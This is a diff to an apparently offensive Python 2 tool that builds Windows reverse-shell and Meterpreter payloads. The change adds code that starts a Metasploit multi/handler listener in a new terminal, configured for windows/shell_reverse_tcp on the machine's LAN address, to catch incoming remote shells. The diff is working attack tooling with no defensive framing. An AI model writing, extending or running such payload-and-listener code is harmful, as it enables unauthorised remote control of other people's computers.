@@ -108,13 +108,21 @@ def statusModules():
 def startHandler():
         '''
         '''
+        lhost = get_lan_ip()
         print '''      
  1 ) Starting the msfconsole listener
  0 ) Exit      
         '''
         opStart = raw_input(BGreen +" [?]" + BBlue + " Enter with Option (1-0): " + Reset).strip() 
         if opStart == "1":
-                print opStart
+                print "\n Using local ip address as default " + lhost
+                if payload == "1":
+                        print " Starting the multi handler...."
+                        subprocess.Popen(args=["gnome-terminal", "--command=msfconsole -x \
+                        'use exploit/multi/handler;set payload windows/shell_reverse_tcp;\
+                        set LHOST %s; set LPORT %s; set ExitOnSession false; exploit -j'"  % (lhost,lport)]).pid
+                elif payload == "2":    
+                        print payload   
         else:
                 print "\n\n Shutdown requested...Goodbye..."
                 exit(0)       
@@ -196,6 +204,7 @@ def mainPayload():
         '''
         '''
         import time, datetime
+        global payload
         print '''
  1) windows/shell_reverse_tcp
  --------------------------------------
@@ -208,7 +217,7 @@ def mainPayload():
  6) windows/meterpreter/reverse_http"
  7) windows/meterpreter/reverse_https"     
         '''
-        payload = raw_input(BGreen +" [?]" + BBlue +" Select Payload 1-8: " + Reset).strip()        
+        payload = raw_input(BGreen +" [?]" + BBlue +" Select Payload 1-7: " + Reset).strip()        
         payload_raw = "temp.raw"
         out = "temp.c"     
         
